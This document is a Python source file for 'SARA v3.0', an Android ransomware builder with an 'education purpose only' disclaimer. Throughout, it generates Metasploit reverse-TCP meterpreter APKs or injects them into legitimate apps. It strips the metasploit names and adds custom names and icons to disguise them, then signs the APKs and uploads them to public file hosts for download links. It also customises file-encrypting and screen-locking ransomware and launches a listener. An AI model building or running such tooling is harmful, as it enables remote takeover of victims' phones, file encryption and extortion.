#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# style and colors
i = '\033[3m'
u = '\033[4m'
w = '\033[0m'
r = '\033[1;91m'
g = '\033[1;92m'
y = '\033[1;33m'
b = '\033[1;94m'
d = '\033[90m'
# global variable
hide = '> /dev/null 2>&1'
sara = f'{d}<{b}sara{d}>{w}'
user = f'{d}<{g}user{d}>{w}'
# import module
try:
    import os
    import re
    import sys
    import time
    import json
    import random
    import datetime
    import requests
    import fileinput
    from PIL import Image
except (ModuleNotFoundError):
    exit(f'''
{sara} : It seems there is a module that you have not installed
         run this command \'{g}pip install -r requirements.txt{w}\'
         to install it.
    ''')
# banner (sara-v3.0)
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(w+d+"      ,,                ,,")
    print(w+d+"    (((((              )))))")
    print(w+d+"   ((((((              ))))))")
    print(w+d+"   ((((((              ))))))")
    print(w+d+"    ((((("+w+b+",r@@@@@@@@@@e,"+w+d+")))))")
    print(w+d+"     ((("+w+b+"@@@@@@@@@@@@@@@@"+w+d+")))")
    print(w+b+"      \@@/"+r+",:::,"+w+b+"\/"+r+",:::,"+w+b+"\@@/")
    print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\")
    print(w+b+"    / @@@\\"+r+"':::'"+w+b+"/\\"+r+"':::'"+w+b+"/@@@ \\    "+w+"'"+r+"Beware of Ransomware"+b+w+"'")
    print(w+b+"   /  /@@@@@@@//\\\@@@@@@@\  \\        "+d+"version 3.0"+w)
    print(w+b+"  (  /  '@@@@@====@@@@@'  \  )")
    print(w+b+"   \(     /          \     )/")
    print(w+b+"     \   (            )   /")
    print(w+b+"          \          /"+w)
# print letter by letter
def prints(text):
    for line in text:
        print(line, end='', flush=True)
        time.sleep(0.008)
    print('')
# print truncate strings
def truncates(text, maxx=20):
    if len(text) > maxx: return text[:maxx - 3] + "..."
    else: return text
# search and replace specific string
def replace_string(oldstr, newstr, file):
    text = f'{sara} : add \'{d}{truncates(newstr)}{w}\' on \'{d}{os.path.basename(file)}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'sed -i \'s#{oldstr}#{newstr}#g\' {file}')
    time.sleep(0.05)
    if not int(os.popen(f'grep -rc \'{newstr}\' {file}', 'r').readline().strip()) > 0: exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    return newstr
# search and replace specific string 2
def replace_strings(oldstr, newstr, file):
    replaces = {oldstr:newstr}
    for line in fileinput.input(file, inplace=True):
        for search in replaces:
            replaced = replaces[search]
            line = line.replace(search,replaced)
        print(line, end="")
# add new icon path (for msfvenom apk)
def add_new_icon(icon, path):
    text = f'{sara} : add \'{d}ic_launcher.png{w}\' into \'{d}mipmap-hdpi-v4{w}\' ... '
    file = f'{path}/res/mipmap-hdpi-v4/ic_launcher.png'
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'mkdir -p {path}/res/mipmap-hdpi-v4/')
    os.system(f'cp -r {icon} {file} {hide}')
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    text = f'{sara} : add \'{d}ic_launcher.png{w}\' into \'{d}AndroidManifest.xml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'sed -i \'s#<application#<application android:icon="@mipmap/ic_launcher"#g\' {path}/AndroidManifest.xml')
    print(text + f'{g}done{w}')
    return file
# rename versionCode in apktool.yml
def rename_version_code(cstr, path):
    text = f'{sara} : add \'{d}{cstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    code = os.popen(f'cat {path}/apktool.yml | grep "versionCode"', 'r').readline().strip()
    os.system(f'sed -i "s/{code}/versionCode: \'{cstr}\'/g" {path}/apktool.yml')
    time.sleep(0.05)
    print(text + f'{g}done{w}')
    return cstr
# rename versionName in apktool.yml
def rename_version_name(nstr, path):
    text = f'{sara} : add \'{d}{nstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    name = os.popen(f'cat {path}/apktool.yml | grep "versionName"', 'r').readline().strip()
    os.system(f'sed -i "s/{name}/versionName: {nstr}/g" {path}/apktool.yml')
    time.sleep(0.05)
    print(text + f'{g}done{w}')
    return nstr
# rename directory 
def rename_dir(olddir, newdir):
    text = f'{sara} : rename \'{d}{olddir.split("/")[-1]}{w}\' into \'{d}{newdir.split("/")[-1]}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'cp -rf {olddir} {newdir} {hide};rm -rf {olddir}')
    time.sleep(0.05)
    if not os.path.isdir(newdir): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    return newdir
# upload file to transfer.sh (primary url) or file.io (second url)
def upload_file(file):
    prints(f'''
{sara} : do you want to upload \'{g}{file}{w}\' ?
         
         (1) yes, i want to upload
         (2) no thanks
    ''')
    asks = str(input(f'{user} : '))
    if asks in ('2', '02'): return False
    text = f'{sara} : upload \'{d}{file}{w}\' into the link ...'
    print(text + f'{y}wait{w}', end='\r')
    link = os.popen(f'curl --upload-file {file} https://transfer.sh/{os.path.basename(file)} --silent', 'r').readline().strip()
    if 'https' not in link:
        try:
            link = re.search('"link":"(.*?)"', os.popen(f'curl -F "file=@{file}" https://file.io --silent','r').read()).group(1)
        except:
            print(text + f'{r}fail{w}')
            return False
    print(text + f'{g}done{w}')
    prints(f'''
{sara} : your file has been successfully uploaded,
         here is the download link ...
         
         {y}{link}{w}''')
# generate raw trojan using msfvenom (metasploit)
def generate_trojan(host, port, name = None):
    if name == None: name = 'trojan'
    text = f'{sara} : generate \'{d}{name}.apk{w}\' using msfvenom{w} ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} -a dalvik --platform android -o {name}.apk {hide}')
    if not os.path.isfile(name + '.apk'): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    return name + '.apk'
# generate trojan and infect to original application (metasploit)
def generate_infected_trojan(host, port, orig):
    name = os.path.basename(orig).replace('.apk', '')
    file = name + '-infected.apk'
    text = f'{sara} : infection \'{g}{name}.apk{w}\' using msfvenom{w} ... '
    print(text + f'{y}wait{w}\n')
    os.system(f'msfvenom -x {orig} -p android/meterpreter/reverse_tcp lhost={host} lport={port} -a dalvik --platform android -o {file}')
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    text = f'{sara} : infection \'{g}{name}-infected.apk{w}\' using msfvenom{w} ... '
    print('\n' + w + text + f'{g}done{w}')
    return file
# generate custom file locker ransomware (encrypter)
def genertare_file_locker(name, desc, icon):
    base = 'data/tmp/encrypter.apk'
    path = name.lower().replace(' ', '')
    file = path + '.apk'
    os.system(f'cp -f {base} {file}')
    decompile(file)
    replace_string('"app_name">app_name', f'"app_name">{name}', f'{path}/res/values/strings.xml')
    replace_string('app_name', name, f'{path}/smali/com/termuxhackersid/services/EncryptionService.smali')
    replace_string('app_name', name, f'{path}/smali/com/termuxhackersid/services/DecryptionService.smali')
    replace_string('app_desc', desc, f'{path}/smali/com/termuxhackersid/services/EncryptionService.smali')
    replace_string('app_desc', desc, f'{path}/smali/com/termuxhackersid/ui/MainActivity$a.smali')
    replace_string('app_desc', desc, f'{path}/smali/com/termuxhackersid/ui/MainActivity.smali')
    text = f'{sara} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
        if os.path.isfile(line):
            with Image.open(line) as f:
                X, Z = f.size
                size = str(X) + 'x' + str(Z)
                logo = 'lock-' + os.path.basename(icon)
                os.system(f'cp -R {icon} {logo}')
                os.system(f'mogrify -resize {size} {logo};cp -R {logo} {line};rm -rf {logo}')
        else: exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    random_digit = str(random.randint(1,9))
    random_version = f'{random_digit}.0'
    rename_version_code(random_digit, path)
    rename_version_name(f'{random_version} by @{name.lower().replace(" ","")}', path)
    file = recompile(path)
    apps = uber_apk_signer(file)
    upload_file(apps)
    return apps

# generate custom screen locker ransomware (passprhase)
def genertare_screen_locker(name, head, desc, keys, icon):
    base = 'data/tmp/lockscreen.apk'
    path = name.lower().replace(' ', '')
    file = path + '.apk'
    os.system(f'cp -f {base} {file}')
    decompile(file)
    replace_string('"app_name">app_name', f'"app_name">{name}', f'{path}/res/values/strings.xml')
    replace_string('app_head', head, f'{path}/res/values/strings.xml')
    replace_string('app_desc', desc, f'{path}/res/values/strings.xml')
    print(f'{sara} : add \'{d}{keys}{w}\' as passprhase ... {y}wait{w}', end='\r')
    replace_strings('app_keys', keys, f'{path}/smali/com/termuxhackers/id/MyService$100000000.smali')
    print(f'{sara} : add \'{d}{keys}{w}\' as \'{d}passprhase{w}\' ... {g}done{w}')
    text = f'{sara} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
        if os.path.isfile(line):
            with Image.open(line) as f:
                X, Z = f.size
                size = str(X) + 'x' + str(Z)
                logo = 'lock-' + os.path.basename(icon)
                os.system(f'cp -R {icon} {logo}')
                os.system(f'mogrify -resize {size} {logo};cp -R {logo} {line};rm -rf {logo}')
        else: exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    random_digit = str(random.randint(1,9))
    random_version = f'{random_digit}.0'
    rename_version_code(random_digit, path)
    rename_version_name(f'{random_version} by @{name.lower().replace(" ","")}', path)
    file = recompile(path)
    apps = uber_apk_signer(file)
    upload_file(apps)
    return apps

# listening trojan with msfconsole (metasploit)
def start_trojan_listener(host, port):
    prints(f'''
{sara} : redirecting to the metasploit console
         payload = \'{r}android/meterpreter/reverse_tcp{w}\'
         with host = \'{y}{host}{w}\' and port = \'{y}{port}{w}\'
         listening as job (0).
    ''')
    os.system(f'msfconsole -q -x "use payload/android/meterpreter/reverse_tcp;set lhost {host};set lport {port};exploit -j"')
# signing apk file with uber-apk-signer (JAR)
def uber_apk_signer(file):
    text = f'{sara} : signing \'{d}{file}{w}\' using uber-apk-signer ... '
    print(text + f'{y}wait{w}', end='\r')
    sign = os.path.basename(file).replace('.apk', '')
    os.system(f'java -jar data/bin/ubersigner.jar -a {file} --ks data/key/debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging {hide}')
    os.system(f'rm -rf {file} *.idsig {hide}')
    os.system(f'cp -rf {sign}-aligned-signed.apk {sign}.apk {hide}; rm -rf {sign}-aligned-signed.apk {hide}')
    if not os.path.isfile(f'{sign}.apk'): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    return sign + '.apk'
# decompiling apk file with apktool
def decompile(file):
    text = f'{sara} : decompile \'{d}{file}{w}\' using apktool ... '
    path = os.path.basename(file).replace('.apk', '')
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'apktool d {file} {hide}')
    if not os.path.isdir(path): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    os.remove(file)
    return path
# recompiling apk path with apktool (with aapt2 as second options)
def recompile(path):
    text = f'{sara} : recompile \'{d}{path}{w}\' using apktool ... '
    file = path + '.apk'
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'apktool b {path} -o {file} {hide}')
    if not os.path.isfile(file):
        print(text + f'{y}wait{w} ({d}aapt2{w})', end='\r')
        os.system(f'apktool b {path} -o {file} --use-aapt2 {hide}')
    time.sleep(0.5)
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    os.system(f'rm -rf {path} {hide}')
    return file
# SARA V3.0
class __sara__:

    def __init__(self):
        self.user = str(os.popen('whoami', 'r').readline().strip())
        self.ipv4 = '127.0.0.1'
        self.data = 'data'
    
    def custom_trojan(self):
        banner()
        prints(f'''
{sara} : you can fill or leave blank for using
         default configuration. the default configuration is
         host = \'{y}{self.ipv4}{w}\' port = \'{y}4444{w}\' name = \'{r}trojan.apk{w}\'
         and icon = \'{r}data/tmp/icon.png{w}\'.

         custom trojan apk (client)
        ''')
        name = str(input(f'         set app name: '))
        if not name: name = 'trojan'
        icon = str(input(f'         set app icon: '))
        if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
        host = str(input(f'         set app host: '))
        if not host: host = self.ipv4
        port = str(input(f'         set app port: '))
        if not port: port = '4444'
        prints(f'''
{sara} : well this process takes a few minutes,
         please be patient until the process is complete 
        ''')
        file = generate_trojan(host, port, name.replace(' ', '').replace('.apk', '').lower())
        path = decompile(file)
        replace_string('MainActivity', name, f'{path}/res/values/strings.xml')
        add_new_icon(icon, path)
        for line in os.popen(f'grep -rc \'metasploit\' {path}', 'r').read().splitlines():
            line = line.split(':')
            if int(line[1]) > 0: replace_string('metasploit', path, line[0])
        rename_dir(f'{path}/smali/com/metasploit/', f'{path}/smali/com/{path}/')
        random_digit = str(random.randint(1,9))
        random_version = f'{random_digit}.0'
        rename_version_code(random_digit, path)
        rename_version_name(f'{random_version} by @{path}', path)
        apps = recompile(path)
        apps = uber_apk_signer(apps)
        upload_file(apps)
        if not os.path.isfile(apps): exit(f'\n{sara} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
        prints(f'''
{sara} : your trojan apps successfully created
         the application is saved as \'{g}{apps}{w}\'
         
         do you want to start listener ?
         
         (1) yes, i want to set new host and port
         (2) yes, i want to use previous host and port
         (3) no thanks, i want to exit
        ''')
        ask = str(input(f'{user} : '))
        if ask in ('1' , '01'):
            host = str(input(f'{user} : set host > '))
            if not host: host = self.ipv4
            port = str(input(f'{user} : set port > '))
            if not port: port = '4444'
        elif ask in ('2', '02'): pass
        else: exit(f'\n{sara} : process completed successfully ...\n')
        start_trojan_listener(host, port)

    def infect_trojan(self):
        banner()
        prints(f'''
{sara} : you can fill or leave blank for using default config
         the default configuration is apps = \'{r}REQUIRED{w}\'
         host = \'{y}{self.ipv4}{w}\' and port = \'{y}4444{w}\'.

         infect trojan apk (client)
        ''')
        orig = str(input(f'         set ori apps: '))
        if not os.path.isfile(orig): exit(f'{sara} : file \'{d}{orig}{w}\' doesn\'t exist !')
        host = str(input(f'         set app host: '))
        if not host: host = self.ipv4
        port = str(input(f'         set app port: '))
        if not port: port = '4444'
        prints(f'''
{sara} : well this process takes a few minutes,
         please be patient until the process is complete 
        ''')
        file = generate_infected_trojan(host, port, orig)
        upload_file(file)
        if not os.path.isfile(file): exit(f'\n{sara} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{sara} : your trojan apps successfully created
         the application is saved as \'{g}{file}{w}\'
         
         do you want to start listener ?
         
         (1) yes, i want to set new host and port
         (2) yes, i want to use previous host and port
         (3) no thanks, i want to exit
        ''')
        ask = str(input(f'{user} : '))
        if ask in ('1' , '01'):
            host = str(input(f'{user} : set host > '))
            if not host: host = self.ipv4
            port = str(input(f'{user} : set port > '))
            if not port: port = '4444'
        elif ask in ('2', '02'): pass
        else: exit(f'\n{sara} : process completed successfully ...\n')
        start_trojan_listener(host, port)
    
    def custom_file_locker(self):
        banner()
        prints(f'''
{sara} : you can fill or leave blank for using default config
         the default configuration is name = \'{r}File Locker{w}\'
         desc = \'{r}Your File Have Been Encrypted{w}\'
         and icon = \'{y}data/tmp/icon.png{w}\'.

         custom file locker apk (encrypter)
        ''')
        name = str(input(f'         set app name: '))
        if not name: name = 'File Locker'
        desc = str(input(f'         set app desc: '))
        if not desc: desc = 'Your File Have Been Encrypted'
        icon = str(input(f'         set app icon: '))
        if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
        prints(f'''
{sara} : well this process takes a few minutes,
         please be patient until the process is complete 
        ''')
        file = genertare_file_locker(name, desc, icon)
        os.system(f'cp -r data/tmp/decrypter.apk .')
        if not os.path.isfile(file): exit(f'\n{sara} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{sara} : your file locker apps successfully created
         the encrypter is saved as \'{g}{file}{w}\'
         the decrypter is saved as \'{g}decrypter.apk{w}\'
        ''')
    
    def custom_screen_locker(self):
        banner()
        prints(f'''
{sara} : you can fill or leave blank for using default config
         the default configuration is name = \'{r}Screen Locker{w}\'
         head = \'{r}Your Phone Is Locked{w}\'
         desc = \'{r}locked by sara@termuxhackers-id{w}\'
         icon = \'{y}data/tmp/icon.png{w}\' and keys = \'{y}s3cr3t{w}\'

         custom lock screen apk (passprhase)
        ''')
        name = str(input(f'         set app name: '))
        if not name: name = 'Screen Locker'
        head = str(input(f'         set app head: '))
        if not head: head = 'Your Phone Is Locked'
        desc = str(input(f'         set app desc: '))
        if not desc: desc = 'locked by sara@termuxhackers-id'
        icon = str(input(f'         set app icon: '))
        if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
        keys = str(input(f'         set app keys: '))
        if not keys: keys = 's3cr3t'
        prints(f'''
{sara} : well this process takes a few minutes,
         please be patient until the process is complete 
        ''')
        file = genertare_screen_locker(name, head, desc, keys, icon)
        if not os.path.isfile(file): exit(f'\n{sara} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{sara} : your screen locker apps successfully created
         the application is saved as \'{g}{file}{w}\'
         the secret key (passprhase) \'{g}{keys}{w}\'
        ''')

    def menu(self):
        banner()
        prints(f'''
{sara} : Hi user, welcome to @{y}SARA{w} :)

{sara} : sara is a simple android ransomware attack
         this tool is made for education purpose only
         the author is not responsible for any loses
         or damage caused by this programs.

{sara} : can i help you ?
         
         (1) build trojan ransomware ({b}metasploit{w})
         (2) build locker ransomware ({b}filelocker{w})
         (3) build screen ransomware ({b}screenlock{w})
         (4) exit!
        ''')
        while True:
            main = str(input(f'{user} : '))
            if main in ('1', '01'):
                banner()
                prints(f'''
{sara} : ok, you can choose one ...

         (1) build custom trojan ({b}metasploit{w})
         (2) build trojan and infect ({b}metasploit{w})
         (3) back to previous
                ''')
                while True:
                    main_menu = str(input(f'{user} : '))
                    if main_menu in ('1', '01'): self.custom_trojan() 
                    elif main_menu in ('2', '02'): self.infect_trojan()
                    elif main_menu in ('3', '03', 'back'): pass
                    else: print(f'{sara} : sorry, no command found for: {main_menu}'); continue
                    break
            elif main in ('2', '02'): self.custom_file_locker()
            elif main in ('3', '03'): self.custom_screen_locker()
            elif main in ('4', '04', 'exit'): exit(1)
            else: print(f'{sara} : sorry, no command found for: {main}'); continue
            break
        input(f'{sara} : press enter for back to \'{g}main menu{w}\' (enter) ')
        self.menu()

if __name__ == '__main__':
    try: __sara__().menu()
    except KeyboardInterrupt: exit(1)
